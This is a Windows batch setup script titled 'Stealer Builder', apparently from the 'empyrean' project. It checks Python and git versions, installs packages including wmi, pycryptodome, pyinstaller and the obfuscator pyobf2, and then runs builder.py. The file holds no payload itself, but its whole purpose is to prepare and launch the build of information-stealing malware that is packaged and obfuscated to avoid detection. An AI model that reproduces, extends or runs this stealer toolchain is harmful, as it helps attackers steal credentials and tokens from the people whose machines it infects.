@echo off
mode con: cols=100 lines=30
title Stealer Builder
color 0a
cls

python --version 2>&1 | findstr " 3.11" >nul
if %errorlevel% == 0 (
    echo python 3.11.x and up are not supported by empyrean. Please downgrade to python 3.10.x.
    pause
    exit
)

::fixed by K.Dot cause dif
git --version 2>&1>nul
if %errorlevel% == 9009 (
    echo git is either not installed or not added to path! You can install it here https://git-scm.com/download/win
    pause
    exit
    )

py -3.10 -m pip uninstall nextcord
py -3.10 -m pip install --upgrade psutil
py -3.10 -m pip install --upgrade requests
py -3.10 -m pip install --upgrade wmi
py -3.10 -m pip install --upgrade pycryptodome
py -3.10 -m pip install --upgrade discord
py -3.10 -m pip install --upgrade discord.py
py -3.10 -m pip install --upgrade pillow
py -3.10 -m pip install --upgrade pypiwin32
py -3.10 -m pip install --upgrade tinyaes
py -3.10 -m pip install --upgrade wheel   
py -3.10 -m pip install --upgrade pyinstaller
py -3.10 -m pip install --upgrade InquirerPy
py -3.10 -m pip install --upgrade rich
py -3.10 -m pip install --upgrade pyobf2==1.1.5

cls

if exist build rmdir /s /q build
py -3.10 builder.py

pause
